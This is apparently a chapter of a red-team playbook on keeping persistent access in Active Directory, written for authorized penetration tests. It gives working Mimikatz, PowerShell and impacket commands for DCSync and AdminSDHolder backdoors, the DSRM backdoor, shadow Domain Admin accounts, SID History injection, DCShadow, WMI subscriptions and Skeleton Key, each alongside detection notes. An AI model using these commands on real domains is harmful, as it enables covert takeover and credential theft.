# Phase 8: Persistence

> Maintaining access after the initial compromise. Some techniques survive password resets, some survive reimaging, some survive forest-wide rebuilds.

**⚠️ Real-engagement note**: Persistence techniques should only be used if your SOW explicitly authorizes "persistence demonstration". Most engagements just want proof of impact — not implants. Discuss with your team lead.

---

## Persistence Tier List

| Technique | Survives | Stealth | Effort to remove |
|-----------|----------|---------|------------------|
| Golden Ticket | krbtgt 1x reset, user delete | 🟡 | krbtgt reset 2x |
| Silver Ticket | Service password change | 🟢 | Change service password |
| DCSync ACL grant | Password resets | 🟡 | Audit & remove ACL |
| AdminSDHolder grant | Most cleanups (60-min replay) | 🔴 | Audit AdminSDHolder ACL |
| Skeleton Key | Until DC reboot | 💀 | DC reboot |
| DSRM backdoor | Most cleanups | 🟡 | Reset DSRM password + reg key |
| New shadow DA | Until discovered | 🟡 | Audit & disable account |
| SID History injection | Most cleanups | 🟡 | Clear SIDHistory attribute |
| Shadow Credentials | Password resets | 🟢 | Clear msDS-KeyCredentialLink |

---

## 1. Golden / Silver Tickets

See `07-domain-dominance.md`. Golden Ticket is the primary "I still own this domain" persistence — survives almost everything except a double krbtgt reset.

---

## 2. DCSync ACL Grant

**Concept**: Grant a low-priv account the two replication rights on the domain object. They can then DCSync anytime — no DA needed.

```powershell
# Give backdoor_user DCSync rights
Add-DomainObjectACL -TargetIdentity "DC=lab,DC=local" \
  -PrincipalIdentity backdoor_user -Rights DCSync
```

🟡 **OPSEC**: Hidden in the noise of normal ACL entries on the domain object unless explicitly audited. Detection requires baselining domain-object ACLs.

---

## 3. AdminSDHolder Grant

**Concept**: Add ACE to AdminSDHolder → SDProp pushes it onto all protected groups every 60 min. Even if the target's ACL is cleaned up, the next SDProp cycle re-adds it.

```powershell
Add-DomainObjectACL -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=lab,DC=local' \
  -PrincipalIdentity backdoor_user -Rights All
```

🔴 **OPSEC**: AdminSDHolder is heavily monitored in mature environments. Defender for Identity directly alerts on changes here.

---

## 4. DSRM Backdoor

**Concept**: Every DC has a local account named "Administrator" used for Directory Services Restore Mode. By default it can only be used in DSRM boot. A registry tweak enables it for network logon — then you have a "local admin" path to the DC that survives most cleanups.

```powershell
# On the DC, as admin
Set-ItemProperty 'HKLM:\System\CurrentControlSet\Control\Lsa\' \
  -Name DsrmAdminLogonBehavior -Value 2

# Dump DSRM hash (it's stored as a local SAM secret)
# In Mimikatz (must run as SYSTEM on DC):
token::elevate
lsadump::sam
# DSRM is in the SAM hashes — labeled with the DC name
```

Use the hash to authenticate as `.\Administrator` (note the `.\` — local context):
```bash
secretsdump.py -hashes :<DSRM_NTLM_hash> 'Administrator@10.10.10.10' -no-pass
psexec.py -hashes :<DSRM_NTLM_hash> Administrator@10.10.10.10
```

🟡 **OPSEC**: Registry key modification = Event 4657. The "Administrator" local logon to a DC is highly suspicious by itself.

---

## 5. New Shadow Admin

The dumbest persistence: just create a new account with a service-account-looking name and add to DA.

```powershell
New-ADUser -Name "svc_AzureSync" -SamAccountName "svc_AzureSync" `
  -AccountPassword (ConvertTo-SecureString 'CompletelyNormalP@ss123' -AsPlainText -Force) `
  -Enabled $true -PasswordNeverExpires $true
Add-ADGroupMember -Identity "Domain Admins" -Members "svc_AzureSync"

# Slightly hide it
Set-ADUser svc_AzureSync -Replace @{adminCount=1; description="Sync service - do not modify"}
```

🔴 **OPSEC**: Event 4720 (account creation), 4728 (group add). Any monitoring catches this. But it works against lazy SOCs because the name looks legit.

---

## 6. SID History Injection

**Concept**: `SIDHistory` is an AD attribute that lists "extra SIDs this user effectively belongs to" — used for cross-domain migration. Inject the Domain Admins SID into a regular user's SIDHistory → they get DA rights without being in the DA group.

```powershell
# Mimikatz (requires DSRM mode or DC privileges via DCShadow)
sid::patch
sid::add /sam:backdoor_user /new:S-1-5-21-...-512
# 512 = Domain Admins RID

# Cleanup: clear sidHistory attribute on the user
```

🟡 **OPSEC**: Defender for Identity flags SIDHistory injections in 5136 events. Requires DSRM mode or DCShadow on the DC, so the act itself is loud.

---

## 7. Shadow Credentials (Persistent)

If you abused shadow credentials for initial access (see `06-privesc.md` § Shadow Credentials), **leave the key** on the target → you keep PKINIT auth indefinitely.

```bash
certipy shadow add -u jdoe@lab.local -p Password1 -account 'targetuser' -dc-ip 10.10.10.10
# Saves a cert+key. The key stays on target's msDS-KeyCredentialLink.
# You can re-auth and re-derive the NTLM hash anytime via PKINIT.
```

🟢 **OPSEC**: Reads of `msDS-KeyCredentialLink` are not commonly audited. Writes are detectable via Event 5136 with attribute audit.

---

## 8. DCShadow (Advanced)

**Concept**: Register a rogue DC and push attribute changes via replication. Bypasses normal logging because the changes are pushed as replication, not as user-driven changes.

```powershell
# Mimikatz (two sessions: one as SYSTEM, one as DA)
# Session 1 (SYSTEM):
!+
!processtoken
lsadump::dcshadow /object:CN=jdoe,CN=Users,DC=lab,DC=local \
  /attribute:primaryGroupID /value:519

# Session 2 (DA):
lsadump::dcshadow /push
```

🟡 **OPSEC**: Bypasses many audit logs by design. Detection requires monitoring for new replication partners (Event 4742 / Defender for Identity "Suspicious DC promotion").

---

## 9. Logon Scripts / GPO Persistence

Drop a startup/logon script via a controlled GPO. Same technique as Phase 6 GPO Abuse but with "stays there long-term" intent. Useful if you want EVERY workstation user to run your beacon at logon.

---

## 10. WMI Event Subscriptions

Persistent code execution via WMI without files on disk. Filter+Consumer+Binding that runs on specific events (logon, timer, etc.).

```powershell
# Permanent WMI event subscription — runs PowerShell on every logon
$Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter \
  -Arguments @{Name='SystemUpdate';EventNamespace='root\cimv2';QueryLanguage='WQL';
  Query="SELECT * FROM Win32_VolumeChangeEvent WHERE EventType=2"}

$Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer \
  -Arguments @{Name='SystemUpdate';CommandLineTemplate="powershell -enc <base64>"}

Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding \
  -Arguments @{Filter=$Filter;Consumer=$Consumer}
```

🟡 **OPSEC**: Sysmon Event 19/20/21 specifically logs WMI subscriptions. EDRs increasingly fingerprint common WMI persistence patterns.

---

## Cleanup Checklist (Important!)

After an engagement, document and revert every persistence mechanism:

- [ ] List all created accounts
- [ ] List all modified ACLs (especially on domain object, AdminSDHolder)
- [ ] List all golden/silver tickets issued (recommend krbtgt reset 2x)
- [ ] List all shadow credentials added
- [ ] List all GPO modifications
- [ ] List all registry persistence
- [ ] List all WMI subscriptions added

Hand this to the customer in the report so they can verify the environment is clean.

---

## Next Step

→ **Phase 9: Forest & Trust Attacks** (`09-trust-attacks.md`) for multi-domain pivoting
→ **Phase 12: Reporting** (`12-reporting.md`) to write it up

---

## Skeleton Key — Full Detail & Cleanup

**Concept**: Mimikatz patches the LSASS process on a live DC, specifically the `msv1_0.dll` authentication package. The patch makes LSASS accept a hardcoded master password (`mimikatz` by default) for **any account** via NTLM auth, while the legitimate password still works. It's purely in-memory — no files written, survives no reboot.

**What the patch actually does**:
- Finds `msv1_0!MsvpPasswordValidate` in memory
- Overwrites a conditional branch so that any password passes the NTLM hash comparison
- Default master password hash: `60BA4FCADC466C7A033C178194C03DF6` (NTLM of `mimikatz`)

```powershell
# On DC, as DA (must have SeDebugPrivilege)
privilege::debug
misc::skeleton
# Output: "Skeleton Key Patched" on success
# Now any account accepts password "mimikatz"

# Test (from any machine)
net use \\dc01.lab.local\C$ /user:administrator mimikatz
# Should succeed even though "mimikatz" is not the real password
```

**Scope limitations**:
- **Memory-only** — DC reboot removes the patch entirely
- **Kerberos auth is not affected** — only NTLM auth uses the patch. If clients use Kerberos (default), Skeleton Key doesn't work without also downgrading to NTLM
- **Multiple DCs**: you must patch each DC separately — the patch is per-process per-machine
- **RC4 encryption anomaly**: since Skeleton Key forces RC4 in some code paths, it causes encryption downgrade alerts across the domain

**Detection**:
- Every modern EDR detects LSASS memory writes (Sysmon Event 10)
- Event 4673 / 4674 — sensitive privilege use on DC (SeDebugPrivilege)
- Defender for Identity: "Suspected skeleton key attack"
- The RC4 encryption downgrade ripple is visible in 4769 events across the domain
- Process memory scanning finds the patch bytes if the EDR does periodic scans

**Cleanup**: Simply reboot the DC. The patch is gone. No AD objects, registry, or files are modified.

**Recommendation**: Almost never use in real engagements. It's detectable, it affects every user, and a reboot cleans it up making it hard to demonstrate persistent impact. Demonstrate the access another way (Golden Ticket or DCSync) and mention Skeleton Key in the report as a theoretical capability.

